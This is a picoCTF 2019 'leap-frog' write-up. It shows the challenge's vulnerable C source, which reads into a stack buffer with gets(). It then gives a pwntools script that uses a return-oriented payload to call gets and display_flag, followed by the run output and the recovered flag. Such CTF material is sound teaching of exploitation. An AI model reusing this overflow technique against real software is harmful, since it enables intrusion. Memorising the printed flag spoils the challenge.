# PicoCTF19 leap-frog

## Challenge

Can you jump your way to win in the following [program](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop) and get the flag? You can find the program in /problems/leap-frog on the shell server? [Source](https://2019shell1.picoctf.com/static/a7394c555b8cd0a7eac288c45367c49d/rop.c).

## Hints

Try and call the functions in the correct order!

Remember, you can always call `main()` again!

## Solution

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdbool.h>

#define FLAG_SIZE 64

bool win1 = false;
bool win2 = false;
bool win3 = false;

void leapA() {
  win1 = true;
}

void leap2(unsigned int arg_check) {
  if (win3 && arg_check == 0xDEADBEEF) {
    win2 = true;
  }  else if (win3) {
    printf("Wrong Argument. Try Again.\n");
  } else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void leap3() {
  if (win1 && !win1) {
    win3 = true;
  } else {
    printf("Nope. Try a little bit harder.\n");
  }
}

void display_flag() {
  char flag[FLAG_SIZE];
  FILE *file;
  file = fopen("flag.txt", "r");
  if (file == NULL) {
    printf("'flag.txt' missing in the current directory!\n");
    exit(0);
  }
  fgets(flag, sizeof(flag), file);
  
  if (win1 && win2 && win3) {
    printf("%s", flag);
    return;
  } else if (win1 || win3) {
    printf("Nice Try! You're Getting There!\n");
  } else {
    printf("You won't get the flag that easy..\n");
  }
}

void vuln() {
  char buf[16];
  printf("Enter your input> ");
  return gets(buf);
}

int main(int argc, char **argv){
  setvbuf(stdout, NULL, _IONBF, 0);
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
}
```

It seems that in order to print the flag we first need to set `win1`, `win2`, `win3` to `true`, then call `display_flag()`.

There are three corresponding functions which seem to set these booleans, but `leap3()` has the impossible condition `win1 && !win1` and we can't jump past that check due to ASLR.

What if we just use the `gets()` function in Libc which is able to write anything from stdin into any writable segment of memory. So we can use `gets()` to set `win1`, `win2`, and `win3` to true, and skip calling all the `leap()` functions.

We can set all the variables to `true` with a payload that:

    - Padding of A's for a Buffer Overflow
    - gets_plt - first function to call
    - flag_addr - second function to call
    - win_addr - the buffer parameter being passed to gets

```python
from pwn import *
import sys
import subprocess

BINARY = './rop'
context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

if len(sys.argv) < 2:
    stdout = process.PTY
    stdin = process.PTY
    sh = process(BINARY, stdout=stdout, stdin=stdin)
    REMOTE = False
else:
    s = ssh(host='2019shell1.picoctf.com', user='samson', password="REDACTED")
    sh = s.process('rop', cwd='/problems/leap-frog')
    REMOTE = True

gets_plt = 0x08048430
win1_addr = 0x0804A03D
display_flag_addr = 0x080486b3
payload = 'A'*28
payload += p32(gets_plt)
payload += p32(display_flag_addr)
payload += p32(win1_addr)
sh.sendlineafter('> ', payload)
sh.sendline('\x01\x01\x01')
sh.interactive()
```

```bash
samson@pico-2019-shell1:/problems/leap-frog$ python ~/test2.py 
[*] '/problems/leap-frog/rop'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './rop': pid 3016256
[*] Switching to interactive mode
picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}
[*] Got EOF while reading in interactive
```

## Flag

`picoCTF{h0p_r0p_t0p_y0uR_w4y_t0_v1ct0rY_f60266f9}`